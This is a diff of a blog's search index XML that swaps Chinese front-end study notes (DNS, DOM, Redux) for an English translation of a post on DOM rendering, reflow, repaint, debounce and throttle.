@@ -1,196 +1,95 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DNS原理基础</title>
-    <url>/en/2021/11/25/DNS%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p><strong>DNS，又称为域名系统（Domain Names System），是一项互联网服务，用于进行域名和与之相对应的IP地址进行转化的服务器。</strong></p>
-<a id="more"></a>
-
-<h1 id="Domain-Names-System"><a href="#Domain-Names-System" class="headerlink" title="Domain Names System"></a>Domain Names System</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>DNS用于将域名转换为IP地址。其中：</p>
+    <title></title>
+    <url>/en/2022/02/17/DOM%20&amp;%20BOM/</url>
+    <content><![CDATA[<hr>
+<p>title: DOM &amp; BOM<br>date: 2021-11-04<br>categories: FrontEnd/FrontEnd<br>tags: [DOM]<br>comments: false<br>summary_img: … /cover/orange.jpg<br>summary_img: … /cover/orange.jpg<br>**This chapter introduces DOM concepts, the cost of manipulating the DOM, the mechanics of browser rendering engines, performance optimizations, and common interview questions such as throttling and anti-jitter. **</p>
+<p>&lt;! –more–&gt;</p>
+<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="1-What-is-the-DOM"><a href="#1-What-is-the-DOM" class="headerlink" title="1. What is the DOM"></a>1. What is the DOM</h2><p>The <code>DOM</code> is the <code>Document Object Model</code>, <strong>Document Object Model</strong>, inside which are interfaces, i.e. methods and functions.</p>
+<p>Official definition: DOM is a <strong>language-independent programmatic interface (API)</strong> for manipulating XML and HTML documents. It is mainly used in browsers to deal with HTML documents and is used to access data in the documents using the DOM API.<br>The DOM is a language-independent API, but its interface in the browser is implemented in JavaScript, and the DOM becomes an important part of the JS coding now.</p>
+<h2 id="2-JS-modifying-DOM-elements-is-costly"><a href="#2-JS-modifying-DOM-elements-is-costly" class="headerlink" title="2. JS modifying DOM elements is costly"></a>2. JS modifying DOM elements is costly</h2><p>Every manipulation of the DOM is preceded by <strong>access to the DOM</strong>, so it also consumes performance.<br>On top of this, because <strong>modifying the DOM</strong> causes the browser to recalculate the geometric changes to the page, triggers a <strong>rearrangement</strong> (reflow - rollback process) and <strong>redrawing</strong> of the browser’s templating engine, which in turn consumes even more performance.</p>
+<h2 id="3-How-the-browser-rendering-engine-works-and-how-it-works"><a href="#3-How-the-browser-rendering-engine-works-and-how-it-works" class="headerlink" title="3. How the browser rendering engine works and how it works"></a>3. How the browser rendering engine works and how it works</h2><p>After the browser has downloaded all the resources in the page (e.g. HTML, JavaScript, CSS, images, etc.), a 6-step process occurs as follows.</p>
 <ol>
-<li>IP地址：一组用点分隔的能唯一标识互联网中的计算机的数字组合</li>
-<li>域名：一串用点分隔的名字，用来表示计算机的名称</li>
-</ol>
-<h2 id="域名构成"><a href="#域名构成" class="headerlink" title="域名构成"></a>域名构成</h2><p><strong>域名是层次结构，从上到下（从书写上看是从右到左），分为根域名、顶级域名、二级域名、三级域名等等。</strong></p>
-<blockquote>
-<ol>
-<li><p>根域名：root</p>
-<ol start="2">
-<li><blockquote>
-<p>顶级域名：net, com, edu, org…</p>
-<ol start="3">
-<li><blockquote>
-<p>二级域名：ibm, baidu, alibaba, ….</p>
-<ol start="4">
-<li><blockquote>
-<p>三级域名：www, mail, …</p>
-</blockquote>
+<li><p>parse the HTML and build the DOM Tree (DOM Tree)</p>
+</li>
+<li><p>parse the CSS to create the CSS rule tree (CSSOM Tree)</p>
+</li>
+<li><p>merge the DOM Tree and CSS rule tree to produce the render tree (render Tree)</p>
+</li>
+<li><p>layout the render tree, calculate the size and position of each element according to the generated render tree, and get the geometry information of each node. (Calculate the position and size of the elements based on the size of the viewport) (rearrangement will take this step)</p>
+</li>
+<li><p>draw the render tree to draw the page pixel information (get the number of pixels per node based on the geometric information of each node on the render tree) (redrawing will take this step)</p>
+</li>
+<li><p>the browser sends the pixel information for each layer of nodes to the GPU, which composites and draws the layers to display on the page</p>
 </li>
 </ol>
-</blockquote>
-</li>
+<h3 id="3-1-How-does-the-browser-rendering-engine-generate-the-render-tree"><a href="#3-1-How-does-the-browser-rendering-engine-generate-the-render-tree" class="headerlink" title="3.1 How does the browser rendering engine generate the render tree?"></a>3.1 How does the browser rendering engine generate the render tree?</h3><ol>
+<li>traverses each visible node (except for tags such as meta, link, script, etc.; except for elements with display:none;) starting from the root of the DOM Tree</li>
+<li>for each visible node, find the corresponding rule in the CSSOM and apply the style rule to the corresponding node.</li>
+<li>for each visible node, and its corresponding style, combine to generate a render tree.</li>
 </ol>
-</blockquote>
-</li>
-</ol>
-</li>
-</ol>
-</blockquote>
-<p>注意：在域名的每一个层级都有一个域名服务器，如果顶级域名中，有edu域名服务器，com域名服务器。</p>
-<h2 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h2><ul>
-<li>递归查询：A只请求B，直到B返回A想要的结果。</li>
-<li>迭代查询：A请求B，B返回结果告知A所需要请求的其他服务器，然后A再请求C、D、E等并拿到响应的返回结果。</li>
-</ul>
-<h2 id="域名缓存"><a href="#域名缓存" class="headerlink" title="域名缓存"></a>域名缓存</h2><ul>
-<li><p>对于域名服务器而言：</p>
-<blockquote>
-<p>在首次进行解析域名时，会使用缓存保存域名和对应的IP地址映射。</p>
-</blockquote>
-</li>
-<li><p>对于本地计算机而言：</p>
+<p><strong>Not visible nodes:</strong> Nodes that will not render output (nodes that will not be displayed on the screen) are the following</p>
 <ul>
-<li><p>对于浏览器：</p>
-<blockquote>
-<p>浏览器会在获取网站域名的实际IP后，用缓存保存下来，以减少网络请求次数</p>
-</blockquote>
-</li>
-<li><p>对于操作系统：</p>
-<blockquote>
-<p>操作系统的缓存就是用户自己配置的hosts文件</p>
-</blockquote>
-</li>
+<li>tags such as meta, link, script, etc;</li>
+<li>nodes that are hidden via css, i.e. display:none; (the opacity is not visible to humans, the computer can still see it, so it will still be rendered.) (So will elements with visibility as hidden be rendered? Do a test, a div set visibility invisible, left floating, surrounded by text, to see if the text around to let out a blank area. The final test proved that a blank space was indeed created, which means that the invisibility of visibility and opacity is only invisible to the human eye, but the computer will still calculate the position information and draw it out when generating the render tree. The result of the experiment is shown below :)</li>
 </ul>
-</li>
-</ul>
-<h2 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h2><p>大致有七个步骤</p>
+<h2 id="4-What-is-browser-rendering-engine-reordering-and-redrawing"><a href="#4-What-is-browser-rendering-engine-reordering-and-redrawing" class="headerlink" title="4. What is browser rendering engine reordering and redrawing?"></a>4. What is browser rendering engine reordering and redrawing?</h2><h3 id="4-1-Reordering"><a href="#4-1-Reordering" class="headerlink" title="4.1 Reordering"></a>4.1 Reordering</h3><p>When a change in the <strong>DOM affects the geometric properties (width, height and position)</strong> of an element, the browser needs to recalculate the geometric properties of the element, and likewise the geometric properties and <strong>position</strong> of other adjacent elements will be affected as a result. The browser invalidates the affected part of the render tree and reconstructs the render tree. This process is called “reordering”.</p>
+<h3 id="4-2-Redrawing"><a href="#4-2-Redrawing" class="headerlink" title="4.2 Redrawing"></a>4.2 Redrawing</h3><p>Once the reordering is complete, the browser redraws the affected parts of the screen in a process called <strong>redrawing</strong>.<br>Since reordering is the step before redrawing, it is natural that <strong>reordering will result in redrawing</strong> when it occurs.</p>
+<h2 id="5-When-is-a-reorder-triggered"><a href="#5-When-is-a-reorder-triggered" class="headerlink" title="5. When is a reorder triggered?"></a>5. When is a reorder triggered?</h2><p>Reordering is required when the page layout and geometry properties change.<br>(At its core: a reorder is triggered whenever an attribute causes a change in position information)</p>
 <ol>
-<li><p>首先搜索浏览器的DNS缓存，其缓存中维护了一张域名与IP地址的对应表，若有则返回，并结束操作</p>
+<li><p>a visible DOM element is added or removed. (A bunch of people queuing up, adding i.e. inserting a person in the middle/deleting i.e. a person in the middle going away, will inevitably affect the position information of the people in the back of the queue)</p>
 </li>
-<li><p>若没有找到，继续搜索操作系统的DNS缓存，若有则返回，并结束操作</p>
+<li><p>element position change (reordering is because the position information has changed)</p>
 </li>
-<li><p>若没找到，则操作系统把域名发给本地域名服务器，本地域名服务器在自己的DNS缓存中采用递归方式查找，若有则返回，并结束操作</p>
+<li><p>element size change (outer margin, inner margin, border thickness, width, height, etc.)</p>
 </li>
-<li><p>若没找到，则本地服务器向上级域名服务器进行迭代查询</p>
+<li><p>change in content, e.g. the amount/content of text changes, or an image is replaced by another image of a different size, font size changes, (bolded text?) Resulting in DOM element position, area change. [Calculations can consume CPU power] 5.</p>
+</li>
+<li><p>page renderer initialization (this is a re-run of the process, right? Definitely a re-arrangement)</p>
+</li>
+<li><p>Browser window size change (Position information will be forced to adjust and a re-arrangement will occur. See the gif below for a page where the position of a div element is not modified by viewport resizing, which also triggers a reorder) [consumes GPU computing power]. Experiment: resize viewport, where the position of a div element in a page is not modified by the viewport adjustment, also triggers a reorder</p>
+</li>
+</ol>
+<h2 id="6-When-is-a-repaint-triggered"><a href="#6-When-is-a-repaint-triggered" class="headerlink" title="6. When is a repaint triggered?"></a>6. When is a repaint triggered?</h2><ol>
+<li><p><strong>Relaying inevitably triggers redrawing</strong>, that’s for sure. This is because the browser’s workflow is to render after typesetting. Redraws flow back (roll back the process) to the typesetting stage, which requires the page to be redrawn afterwards.</p>
+</li>
+<li><p>Cases in which redrawing is triggered individually.<br>Situations other than when the size or position of an element changes, (e.g. when the font colour, background colour etc. changes). (I suspect that bold text will also trigger a redraw, but I have no evidence of this. In theory if you bold text inside a fixed size div, it should not affect the reordering of the elements that follow it, but it is possible that other adjacent text or elements inside that div will be reordered.)</p>
+</li>
+</ol>
+<h2 id="7-Browser-performance-optimisation"><a href="#7-Browser-performance-optimisation" class="headerlink" title="7. Browser performance optimisation"></a>7. Browser performance optimisation</h2><h3 id="7-1-Optimisation"><a href="#7-1-Optimisation" class="headerlink" title="7.1 Optimisation"></a>7.1 Optimisation</h3><p>Modern browsers are pretty well established, as multiple manipulations of the DOM can trigger reordering and redrawing and consume performance. So in addition to our conscious efforts to control the number of DOM manipulations, browsers have been designed to intelligently “throttle” DOM manipulations, for example by implementing queued changes and batch execution.</p>
+<p>To explain, **browsers have a “queue” to store (save) js programs that need to manipulate the DOM. Whenever js code is executed to manipulate the dom, a program is first stored in this queue. After a certain period of time, the browser then links the “ES island” and “DOM island” (that is, the JS engine to link the rendering engine) in a centralised, bulk manner, thus triggering a DOM operation. **You can think of this as “one train after another”.</p>
+<h3 id="7-2-Users-interrupting-optimised-actions"><a href="#7-2-Users-interrupting-optimised-actions" class="headerlink" title="7.2 Users interrupting optimised actions"></a>7.2 Users interrupting optimised actions</h3><p>But we humans don’t perceive this, and may interrupt the browser’s “throttling” step by mistake. Forcing the browser to interrupt the current “wait” to perform an immediate dom operation. This allows the browser to hurry up and finish the JS manipulation of the DOM in its “queue” and then return the latest DOM position information to us. It’s like forcing the doors to close when you press the close button manually.</p>
+<p>This happens when we get the DOM information.</p>
+<p><strong>Properties that interrupt browser optimisation and force a reorder to be triggered:</strong></p>
 <blockquote>
-<ol>
-<li>本地域名服务器向根域名服务器发送请求，其会返回顶级域名服务器地址</li>
-<li>本地域名服务器再向顶级域名服务器发送请求，其会返回二级域名服务器地址</li>
-<li>本地域名服务器再向二级域名服务器发送请求，最终返回该域名对应的IP地址</li>
-</ol>
+<p>offsetTop, offsetLeft, offsetWidth, offsetHeight<br>scrollTop, scrollLeft, scrollWidth, scrollHeight<br>clientTop, clientLeft, clientWidth, clientHeight<br>getComputedStyle()</p>
 </blockquote>
-</li>
+<p>**Because it has to request the latest DOM information from the browser, the browser has to rush the JS engine to the rendering engine to perform a DOM operation. **</p>
+<h2 id="8-Why-is-manipulating-the-DOM-very-expensive"><a href="#8-Why-is-manipulating-the-DOM-very-expensive" class="headerlink" title="8. Why is manipulating the DOM very expensive?"></a>8. Why is manipulating the DOM very expensive?</h2><ol>
+<li>ES and DOM are two different things and each connection consumes performance</li>
+<li>manipulating the DOM leads to reordering and redrawing, which consumes CPU; redrawing consumes GPU</li>
 </ol>
-<hr>
-<p>至此，请求阶段完成，接下来分三步返回结果至浏览器并缓存。</p>
-<ol start="5">
-<li>本地域名服务器将得到的IP地址返回给操作系统，同时缓存该域名与IP的映射</li>
-<li>操作系统将得到的IP地址返回给浏览器，同时缓存该域名与IP的映射</li>
-<li>浏览器得到该域名对应的IP地址，同时缓存该域名与IP的映射</li>
-</ol>
+<h2 id="9-Anti-jitter-amp-throttling-—-from-SegmentFault-Ange"><a href="#9-Anti-jitter-amp-throttling-—-from-SegmentFault-Ange" class="headerlink" title="9. Anti-jitter &amp; throttling — from SegmentFault-Ange"></a>9. Anti-jitter &amp; throttling — from SegmentFault-Ange</h2><h3 id="9-1-Explanation"><a href="#9-1-Explanation" class="headerlink" title="9.1 Explanation"></a>9.1 Explanation</h3><p>Case in point: **Most websites will provide such a button: for returning to the top. **</p>
+<p>This button will only appear after scrolling to a certain position from the top, so let’s now abstract this functional requirement - <strong>Listen to the browser scroll event and return the distance between the current scrollbar and the top</strong>. This could be implemented with a function.</p>
+<p>However, a problem will be found when running it:** The default execution frequency of this function, too ! high! too! ** How high is it? In Chrome, for example, we can click to select the scrollbar of a page, then click once on the [down arrow key] of the keyboard, and find that the function executes <strong>8-9 times</strong>!</p>
+<p>However in reality we don’t need such high frequency feedback, after all the performance of the browser is limited and shouldn’t be wasted, so moving on to discuss how to optimise this scenario.</p>
+<h3 id="9-2-Anti-debounce"><a href="#9-2-Anti-debounce" class="headerlink" title="9.2 Anti-debounce"></a>9.2 Anti-debounce</h3><p><strong>In short, debounce is the process of not executing immediately if a large number of the same events are triggered in a short period of time, but waiting a given amount of time before executing, and then retiming if the event is hit again within a given amount of time</strong>.</p>
+<p>Based on the above scenario, the first idea is first proposed: <strong>Instead of executing the function immediately when the event is triggered for the first time, a deadline value of say 200ms</strong> is given and then.</p>
+<ul>
+<li>If the scroll event is not triggered again within 200ms, then the function is executed</li>
+<li>If the scroll event is triggered again within 200ms, then the current timing is cancelled and the timing starts again</li>
+</ul>
+<p><strong>Effect</strong>: if the same event is triggered in large numbers in a short period of time, the function will only be executed once.</p>
+<h3 id="9-3-Throttle"><a href="#9-3-Throttle" class="headerlink" title="9.3 Throttle"></a>9.3 Throttle</h3><p><strong>In short, a throttle is a function that is executed once at the same interval</strong> if a large number of the same events are triggered in a short period of time.</p>
+<p>Continuing with this thought, the result of using the anti-throttling scheme above to deal with the problem is that</p>
+<ul>
+<li>If a scroll event is constantly triggered for a limited period of time (e.g. some user is idle and holds down the scroll and keeps dragging it around), the current distance to the top will theoretically never be output as long as the triggering does not stop.</li>
+</ul>
+<p>New requirement: **What about giving feedback after a certain time interval even if the user keeps dragging the scroll bar? **</p>
+<p>It’s actually quite simple: we could design a function that <strong>similar to a control valve that opens periodically, i.e. let the function execute once and then temporarily deactivate for a certain period of time, and reactivate after that time</strong> (similar to a skill cooldown).</p>
+<p><strong>Effect</strong>: if the same event is triggered in large numbers over a short period of time, then <strong>after the function is executed once, the function does not work again</strong> for a specified period of time, and does not re-activate until after that time.</p>
 ]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>Network</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DOM &amp; BOM</title>
-    <url>/en/2021/11/04/DOM%20&amp;%20BOM/</url>
-    <content><![CDATA[<p><strong>本章主要介绍DOM概念、操作DOM的代价、浏览器渲染引擎的机制，性能优化以及节流和防抖等常见面试题。</strong></p>
-<a id="more"></a>
-
-<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="1-什么是DOM"><a href="#1-什么是DOM" class="headerlink" title="1. 什么是DOM"></a>1. 什么是DOM</h2><p><code>DOM</code>就是<code>Document Object Model</code>，<strong>文档对象模型</strong>，里边是接口，即方法函数。</p>
-<p>官方定义：DOM是一个**独立于语言的、用于操作XML和HTML文档的程序接口(API)**。在浏览器中主要用于与HTML文档打交道，并且使用DOM API用来访问文档中的数据。<br>DOM是个与ES语言无关的API，它在浏览器中的接口却是用JavaScript来实现的，DOM就成了现在JS编码中的重要部分。</p>
-<h2 id="2-JS修改DOM元素代价很高"><a href="#2-JS修改DOM元素代价很高" class="headerlink" title="2. JS修改DOM元素代价很高"></a>2. JS修改DOM元素代价很高</h2><p>每次操作DOM之前，就会先<strong>访问DOM</strong>，所以也会消耗性能。<br>在此基础上，因为<strong>修改DOM</strong>会导致浏览器重新计算页面的几何变化、引发浏览器模板引擎的<strong>重排</strong>(回流 - 回滚流程)和<strong>重绘</strong>，进而更加消耗性能。</p>
-<h2 id="3-浏览器渲染引擎的工作原理和流程"><a href="#3-浏览器渲染引擎的工作原理和流程" class="headerlink" title="3. 浏览器渲染引擎的工作原理和流程"></a>3. 浏览器渲染引擎的工作原理和流程</h2><p>浏览器下载完页面中的所有资源（比如HTML、JavaScript、CSS、图片等）后，会发生如下的6步过程：</p>
-<ol>
-<li><p>解析HTML，构建DOM树（DOM Tree）</p>
-</li>
-<li><p>解析CSS，生成CSS规则树（CSSOM Tree）</p>
-</li>
-<li><p>合并DOM树和CSS规则树，生成渲染树render树（render Tree）</p>
-</li>
-<li><p>布局render树，根据生成的render树来对各元素尺寸、位置进行计算，得到每个节点的几何信息。（根据视口的大小来计算元素的位置和大小）（重排会走这一步）</p>
-</li>
-<li><p>绘制render树，绘制页面像素信息（根据render树上每个节点的几何信息，得到每个节点的像素数）（重绘会走这一步）</p>
-</li>
-<li><p>浏览器会将各层节点的像素信息发送给GPU，GPU将各层合成、绘制展示到页面上</p>
-</li>
-</ol>
-<h3 id="3-1-浏览器渲染引擎是如何生成渲染树（render-Tree）的？"><a href="#3-1-浏览器渲染引擎是如何生成渲染树（render-Tree）的？" class="headerlink" title="3.1 浏览器渲染引擎是如何生成渲染树（render Tree）的？"></a>3.1 浏览器渲染引擎是如何生成渲染树（render Tree）的？</h3><ol>
-<li>从DOM Tree的根节点开始遍历每一个可见节点（除meta、link、script等这些标签；除display:none;的元素）</li>
-<li>对于每个可见节点，在CSSOM中找到对应规则并将样式规则应用到对应节点上。</li>
-<li>根据每一个可见节点，以及其对应的样式，组合生成渲染树。</li>
-</ol>
-<p><strong>不可见节点：</strong> 不会渲染输出的节点（不会显示在屏幕上的节点）有以下几种</p>
-<ul>
-<li>meta、link、script等标签;</li>
-<li>通过css进行隐藏的节点，即display:none；（opacity对人类不可见，计算机还能看见，所以还会渲染。）（那visibility为隐藏的元素会不会被渲染呢？做个试验，一个div设置visibility不可见，左浮动，周围全是文字，看文字环绕是否让出一块空白区域。最后试验证明确实绕出了一段空白的位置，说明visibility和opacity设置的不可见只是对人类肉眼不可见，计算机还是会在生成render Tree的时候计算位置信息并把他绘制出来。试验结果如下图:)</li>
-</ul>
-<h2 id="4-什么是浏览器渲染引擎的重排和重绘？"><a href="#4-什么是浏览器渲染引擎的重排和重绘？" class="headerlink" title="4. 什么是浏览器渲染引擎的重排和重绘？"></a>4. 什么是浏览器渲染引擎的重排和重绘？</h2><h3 id="4-1-重排"><a href="#4-1-重排" class="headerlink" title="4.1 重排"></a>4.1 重排</h3><p>当<strong>DOM的变化影响了元素的几何属性（宽、高和位置）</strong>，浏览器需要重新计算元素的几何属性，同样其他相邻元素的几何属性和<strong>位置</strong>也会因此受到影响。浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。这个过程称为“重排”。</p>
-<h3 id="4-2-重绘"><a href="#4-2-重绘" class="headerlink" title="4.2 重绘"></a>4.2 重绘</h3><p>完成重排后，浏览器会重新绘制受影响的部分到屏幕中，该过程称为<strong>重绘</strong>。<br>因为重排在重绘的上一步，所以<strong>重排发生后自然会导致重绘</strong>。</p>
-<h2 id="5-什么时候会引发重排？"><a href="#5-什么时候会引发重排？" class="headerlink" title="5. 什么时候会引发重排？"></a>5. 什么时候会引发重排？</h2><p>当页面布局和几何属性改变时就需要重排：<br>（核心就是：只要某个属性能导致位置信息发生改变，就会触发重排 ）</p>
-<ol>
-<li><p>添加或删除可见的DOM元素。(一堆人排队，添加即中间插入了一个人/删除即中间一个人走了，势必会影响后边排队的人的位置信息也发生改变)</p>
-</li>
-<li><p>元素位置改变（重排就是因为位置信息改变了）</p>
-</li>
-<li><p>元素尺寸改变( 外边距、内边距、边框厚度、宽度、高度等)</p>
-</li>
-<li><p>内容改变，例：文本数量/内容改变、或图片被另一个不同尺寸的图片替代、字体大小改变、（文字加粗？）导致DOM元素位置、面积改变。【计算会消耗CPU的能力】</p>
-</li>
-<li><p>页面渲染器初始化（这算重走流程吧，肯定要重排）</p>
-</li>
-<li><p>浏览器窗口尺寸改变（位置信息会被迫调整，发生重排。见下图的gif图，一个页面中div元素的位置不受视口调整而修改，也会引发重排）【消耗GPU的计算能力】。试验：resize视口，一个页面中div元素的位置不受视口调整而修改，也会引发重排</p>
-</li>
-</ol>
-<h2 id="6-什么时候会引发重绘？"><a href="#6-什么时候会引发重绘？" class="headerlink" title="6. 什么时候会引发重绘？"></a>6. 什么时候会引发重绘？</h2><ol>
-<li><p><strong>重排必然引发重绘</strong>，这是肯定的。因为浏览器的工作流程就是排版后渲染。重排会回流（回滚流程）到排版阶段，排版后需要重新绘制页面。</p>
-</li>
-<li><p>单独触发重绘的情况：<br>除元素尺寸、位置发生改变以外的情况，（比如字体颜色、背景色等发生改变）。（我怀疑文字加粗也会触发重排，但是我没有证据。理论上来说如果在一个固定尺寸的div内加粗文字，应该不会影响后边元素的重排，但可能该div内部的其他相邻文字或元素会发生重排。）</p>
-</li>
-</ol>
-<h2 id="7-浏览器的性能优化"><a href="#7-浏览器的性能优化" class="headerlink" title="7. 浏览器的性能优化"></a>7. 浏览器的性能优化</h2><h3 id="7-1-优化"><a href="#7-1-优化" class="headerlink" title="7.1 优化"></a>7.1 优化</h3><p>现代浏览器是相当完善的了，因为多次操作DOM会触发重排重绘、消耗性能。所以除了我们人为的、有意识的去控制操作DOM次数以外，浏览器在设计上进行了优化，也会智能的“节流”操作DOM，比如实现队列化修改、批量执行。</p>
-<p>解释来说就是，<strong>浏览器会有一个“队列”，用以存放（攒着）需要操作DOM的js程序。每当执行一次js操作dom的代码，这个队列里就先暂存一个程序。等到一段时间后，浏览器再集中、批量的链接一次”ES岛”和”DOM岛”（就是让JS引擎去链接渲染引擎），进而触发一次DOM操作。</strong>你可以形象的理解为“过一段时间发一班车”。</p>
-<h3 id="7-2-用户打断优化的操作"><a href="#7-2-用户打断优化的操作" class="headerlink" title="7.2 用户打断优化的操作"></a>7.2 用户打断优化的操作</h3><p>但是我们人类感知不到啊，可能会因为误操作打断浏览器的“节流”步骤。迫使浏览器中断当前的“等待”，去赶紧、立马进行一次dom操作。让浏览器赶紧执行完他攒在“队列”里的JS操作DOM的程序后返回最新的DOM位置信息给我们。这就好像电梯门定时自动关闭，但是你却手动按了关门按钮强迫关门一样。</p>
-<p>这种情况就发生在我们获取DOM信息的时候：</p>
-<p><strong>打断浏览器优化，强迫触发重排的属性：</strong></p>
-<blockquote>
-<p>offsetTop、offsetLeft、offsetWidth、offsetHeight<br>scrollTop、scrollLeft、scrollWidth、scrollHeight<br>clientTop、clientLeft、clientWidth、clientHeight<br>getComputedStyle()</p>
-</blockquote>
-<p><strong>因为要跟浏览器请求最新的DOM信息，所以浏览器就得赶紧让JS引擎去渲染引擎那里进行一次DOM操作。</strong></p>
-<h2 id="8-为什么操作DOM非常昂贵？"><a href="#8-为什么操作DOM非常昂贵？" class="headerlink" title="8. 为什么操作DOM非常昂贵？"></a>8. 为什么操作DOM非常昂贵？</h2><ol>
-<li>ES和 DOM是两种东西，每次连接都需要消耗性能</li>
-<li>操作DOM会导致重排和重绘，重排会占用、消耗CPU; 重绘会占用、消耗GPU</li>
-</ol>
-<h2 id="9-防抖-amp-节流-—-源自思否-安歌"><a href="#9-防抖-amp-节流-—-源自思否-安歌" class="headerlink" title="9. 防抖 &amp; 节流 — 源自思否-安歌"></a>9. 防抖 &amp; 节流 — 源自思否-安歌</h2><h3 id="9-1-解释"><a href="#9-1-解释" class="headerlink" title="9.1 解释"></a>9.1 解释</h3><p>案例：<strong>大多网站会提供这么一个按钮：用于返回顶部。</strong></p>
-<p>这个按钮只会在滚动到距离顶部一定位置之后才出现，那么我们现在抽象出这个功能需求– <strong>监听浏览器滚动事件，返回当前滚条与顶部的距离</strong>。可以用一个函数实现。</p>
-<p>但是，在运行的时候会发现存在一个问题：<strong>这个函数的默认执行频率，太！高！了！。</strong> 高到什么程度呢？以chrome为例，我们可以点击选中一个页面的滚动条，然后点击一次键盘的【向下方向键】，会发现函数执行了<strong>8-9次</strong>！</p>
-<p>然而实际上我们并不需要如此高频的反馈，毕竟浏览器的性能是有限的，不应该浪费在这里，所以接着讨论如何优化这种场景。</p>
-<h3 id="9-2-防抖（debounce）"><a href="#9-2-防抖（debounce）" class="headerlink" title="9.2 防抖（debounce）"></a>9.2 防抖（debounce）</h3><p><strong>简言之，防抖是如果在短时间内大量触发相同事件，不立即执行，而是等待一个给定时间段后再执行，如果给定时间内又触法该事件则重新计时</strong></p>
-<p>基于上述场景，首先提出第一种思路：<strong>在第一次触发事件时，不立即执行函数，而是给出一个期限值比如200ms</strong>，然后：</p>
-<ul>
-<li>如果在200ms内没有再次触发滚动事件，那么就执行函数</li>
-<li>如果在200ms内再次触发滚动事件，那么当前的计时取消，重新开始计时</li>
-</ul>
-<p><strong>效果</strong>：如果短时间内大量触发同一事件，只会执行一次函数。</p>
-<h3 id="9-3-节流（throttle）"><a href="#9-3-节流（throttle）" class="headerlink" title="9.3 节流（throttle）"></a>9.3 节流（throttle）</h3><p><strong>简言之，节流是如果在短时间内大量触发相同事件，即每隔相同一段时间执行一次</strong></p>
-<p>继续思考，使用上面的防抖方案来处理问题的结果是：</p>
-<ul>
-<li>如果在限定时间段内，不断触发滚动事件（比如某个用户闲着无聊，按住滚动不断的拖来拖去），只要不停止触发，理论上就永远不会输出当前距离顶部的距离。</li>
-</ul>
-<p>新需求：<strong>即使用户不断拖动滚动条，也能在某个时间间隔之后给出反馈呢？</strong></p>
-<p>其实很简单：我们可以设计一种<strong>类似控制阀门一样定期开放的函数，也就是让函数执行一次后，在某个时间段内暂时失效，过了这段时间后再重新激活</strong>（类似于技能冷却时间）。</p>
-<p><strong>效果</strong>：如果短时间内大量触发同一事件，那么<strong>在函数执行一次之后，该函数在指定的时间期限内不再工作</strong>，直至过了这段时间才重新生效。</p>
-]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>DOM</tag>
-      </tags>
   </entry>
   <entry>
     <title>HTML基础---学习手记</title>
@@ -535,77 +434,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Redux入门操作详解</title>
-    <url>/en/2021/11/28/Redux%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
-<a id="more"></a>
-
-<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
-<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
-<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
-<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
-<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
-<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
-<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
-<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
